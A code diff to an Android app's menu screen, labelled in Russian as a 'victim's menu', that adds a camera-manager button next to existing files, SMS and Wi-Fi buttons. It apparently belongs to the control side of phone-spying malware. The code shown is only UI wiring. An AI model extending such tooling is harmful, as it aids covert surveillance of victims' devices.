@@ -14,6 +14,7 @@ public class MenuActivity extends AppCompatActivity {
     private Button _filesButton;
     private Button _smsButton;
     private Button _wifiButton;
+    private Button _cameraManager;
 
     public static MenuActivity getInstance() {
         return _instance;
@@ -28,6 +29,7 @@ public class MenuActivity extends AppCompatActivity {
         _filesButton = (Button) findViewById(R.id.filesButton);
         _smsButton = (Button) findViewById(R.id.smsButton);
         _wifiButton = (Button) findViewById(R.id.wifiButton);
+        _cameraManager = (Button) findViewById(R.id.cameraButton);
         _menuTextView = (TextView) findViewById(R.id.menuTextView);
         _victim = getIntent().getStringExtra("victim");
         _menuTextView.setText("Меню жертвы " + _victim);
@@ -50,6 +52,15 @@ public class MenuActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 Intent intent = new Intent(_instance, WifiManagerActivity.class);
+                intent.putExtra("victim", _victim);
+                startActivity(intent);
+            }
+        });
+
+        _cameraManager.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(_instance, CameraManagerActivity.class);
                 intent.putExtra("victim", _victim);
                 startActivity(intent);
             }
